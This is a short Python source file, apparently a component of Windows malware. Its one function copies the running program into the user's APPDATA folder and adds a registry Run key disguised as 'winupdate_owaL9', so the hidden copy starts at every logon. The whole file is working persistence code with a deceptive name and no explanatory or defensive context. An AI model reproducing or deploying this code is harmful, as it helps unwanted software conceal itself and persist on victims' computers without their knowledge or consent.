



import os
import shutil
import sys
import winreg


def add_startup():
    file_path = os.path.realpath(sys.argv[0])
    hidden_path = os.path.join(os.path.normpath(os.environ["APPDATA"]), os.path.basename(file_path))
    shutil.copyfile(file_path, hidden_path)
    regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(regkey, "winupdate_owaL9", 0, winreg.REG_SZ, f"\"{hidden_path}\"")
    winreg.CloseKey(regkey)
    